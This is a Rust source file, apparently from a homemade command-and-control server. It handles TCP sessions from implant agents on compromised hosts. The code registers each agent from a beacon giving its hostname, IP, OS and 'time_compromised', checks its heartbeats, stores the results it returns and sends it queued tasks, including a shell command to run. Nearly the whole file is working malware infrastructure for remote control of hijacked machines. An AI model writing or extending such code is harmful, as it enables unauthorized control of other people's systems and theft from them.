use tokio::net::TcpStream;
use tokio_util::codec::{FramedRead, FramedWrite};
use futures::{SinkExt, StreamExt};
use std::sync::Arc;
use tokio::sync::Mutex;
use std::net::SocketAddr;
use uuid::Uuid;

use crate::communication::codec::JsonCodec;
use crate::communication::message::{AgentMessage, ServerMessage}; 
use crate::core::c2::C2; 
use crate::tasking::agent_command::AgentCommand;
use crate::utils::logging::Logging;


pub async fn _handle_session(stream: TcpStream, addr: SocketAddr, c2: Arc<Mutex<C2>>) {
    // Wrap the TCP stream with the codec to get a framed stream
    let (read_half, write_half) = stream.into_split();
    let mut framed_rx = FramedRead::new(read_half, JsonCodec::<AgentMessage>::new());
    let mut framed_tx = FramedWrite::new(write_half, JsonCodec::<ServerMessage>::new());

    // === Step 1: Handshake ===
    let Some(Ok(msg)) = framed_rx.next().await else {
        let msg = format!("[-] Handshake failed or connection closed early from {}", addr);
        Logging::ERROR.print_message(&msg);
        return;
    };

    match msg {
        AgentMessage::Beacon {
            hostname, ip, os, time_compromised,
        } => {
            // Create/register the agent in the C2
            let mut c2 = c2.lock().await;
            let session = Uuid::new_v4().to_string();
            let agent_id = c2.create_agent(&ip, &hostname, &os, &time_compromised, &session).await.unwrap();
            // Respond to the agent with an Ack (includes its agent ID and session info)
            let ack = ServerMessage::Ack {
                agent_id,
                status: "Registered".to_string(),
                session_id: session
            };

            let _ = framed_tx.send(ack).await;
        }
        // Means Agent states were loaded from somewhere -> saved at some point -> TODO
        // Agent will always create new connection, so never do this
        // AgentMessage::Heartbeat {
        //     agent_id, session_id, result:_
        // }=> {
        //     // Check if agent_id / session id exists
        //     let c2 = c2.lock().await;
        //     if c2.check_session(&session_id).await {
        //         // Update time, and session_id
        //         c2.update_agent_time(agent_id).await;
        //         let session = Uuid::new_v4().to_string();
        //         // update AgentStatus, respond with Ack with a new session id/agent id
        //         let ack = ServerMessage::Ack {
        //             agent_id,
        //             status: "Alive".to_string(),
        //             session_id: session
        //         };

        //     let _ = framed_tx.send(ack).await;
        //     } else {
        //         let msg = format!("No agent exists with agent id {} or session id {}", agent_id, session_id);
        //         Logging::ERROR.print_message(&msg);
        //         return;
        //     }
        // }
        _ => {
            Logging::ERROR.print_message("Expected Beacon, got something else. Disconnecting.");
            return;
        }
    }

    // === Step 2: Main Session Loop ===
    loop {
        tokio::select! {
            incoming = framed_rx.next() => {
                match incoming {
                    Some(Ok(msg)) => {
                        // Handle agent message
                        match msg {
                            AgentMessage::Heartbeat {
                                agent_id, session_id, result
                            }=> {
                                // Update agent's last_seen timestamp
                                let c2 = c2.lock().await;
                                if c2.check_session(&session_id).await {
                                    c2.update_agent_time(agent_id).await;

                                    // Handle results: TODO
                                    match result {
                                        Some(res) => {dbg!(res);}
                                        None => {dbg!("No results returned from heartbeat");}
                                    }

                                    // Check TaskManager for any tasks for agent_id
                                    match c2.get_tasks(agent_id).await {
                                        Some(_tasks) => {
                                            // Send Task to Agent
                                            let task = ServerMessage::Task {
                                                agent_id,
                                                session_id,
                                                command: vec![AgentCommand::RunShell("whoami".to_string())] 
                                                // FIX, need to convert vec of tasks to vec of AgentCommand
                                            };

                                            let _ = framed_tx.send(task).await;

                                            Logging::INFO.print_message(
                                                &format!("[+] Received Heartbeat from Agent {} and send {} tasks", agent_id, 0));
                                        }
                                        None => {
                                            Logging::INFO.print_message(
                                                &format!("[+] Received Heartbeat from Agent {}", agent_id));
                                        }
                                    }
                                }
                            }
                            AgentMessage::Disconnect {
                                agent_id, session_id
                            } => {
                                // Remove agent from C2
                                let mut c2 = c2.lock().await;
                                if c2.check_session(&session_id).await {
                                    c2.remove_agent(agent_id).await;
                                }
                            }
                            _ => {}
                        }
                    }
                    Some(Err(e)) => {
                        eprintln!("Error in session: {}", e);
                        break;
                    }
                    None => {
                        // Connection closed
                        break;
                    }
                }
            }

        }
        // TODO: Check last heartbeat time for agent every X min (10)
        // have some sort of oldest Agent that changes when that oldest Agent checks in
        // then move oldest agent to next oldest (queue or stack)
        // check every X min whether oldest Agent last_seen time meets threshold for marking dead

        tokio::time::sleep(std::time::Duration::from_secs(1)).await;

    }

    // Clean up if needed (e.g., mark agent as offline)
}



pub async fn handle_session2(stream: TcpStream, addr: SocketAddr, c2: Arc<Mutex<C2>>) {
    // Wrap the TCP stream with the codec to get a framed stream
    let (read_half, write_half) = stream.into_split();
    let mut framed_rx = FramedRead::new(read_half, JsonCodec::<AgentMessage>::new());
    let mut framed_tx = FramedWrite::new(write_half, JsonCodec::<ServerMessage>::new());

    // === Step 1: Handshake ===
    let Some(Ok(msg)) = framed_rx.next().await else {
        let msg = format!("[-] Handshake failed or connection closed early from {}", addr);
        Logging::ERROR.print_message(&msg);
        return;
    };

    match msg {
        AgentMessage::Beacon {
            hostname, ip, os, time_compromised,
        } => {
            // Create/register the agent in the C2
            let mut c2 = c2.lock().await;
            let session = Uuid::new_v4().to_string();
            let agent_id = c2.create_agent(&ip, &hostname, &os, &time_compromised, &session).await.unwrap();
            // Respond to the agent with an Ack (includes its agent ID and session info)
            let ack = ServerMessage::Ack {
                agent_id,
                status: "Registered".to_string(),
                session_id: session
            };

            let _ = framed_tx.send(ack).await;
        }
        AgentMessage::Heartbeat {
            agent_id, session_id, result
        }=> {
            // Update agent's last_seen timestamp
            let c2 = c2.lock().await;
            if c2.check_session(&session_id).await {
                c2.update_agent_time(agent_id).await;

                // Handle results: TODO
                match result {
                    Some(res) => {
                        c2.update_result(agent_id, res).await;
                        Logging::SUCCESS.print_message(&format!("Received data from Agent {}", agent_id));
                    }
                    None => {dbg!("No results returned from heartbeat");}
                }

                // Check TaskManager for any tasks for agent_id
                match c2.get_tasks(agent_id).await {
                    Some(tasks) => {
                        let num = &tasks.len();
                        // Send Task to Agent
                        let task = ServerMessage::Task {
                            agent_id,
                            session_id,
                            command: tasks
                        };

                        let _ = framed_tx.send(task).await;

                        Logging::INFO.print_message(
                            &format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num));
                    }
                    None => {
                        let noop = ServerMessage::Noop { agent_id, session_id };
                        let _ = framed_tx.send(noop).await;
                        Logging::INFO.print_message(
                            &format!("[+] Received Heartbeat from Agent {}", agent_id));
                    }
                }
            }
        }
        AgentMessage::Disconnect {
            agent_id, session_id
        } => {
            // Remove agent from C2
            let mut c2 = c2.lock().await;
            if c2.check_session(&session_id).await {
                c2.remove_agent(agent_id).await;
            }
        }
    }
}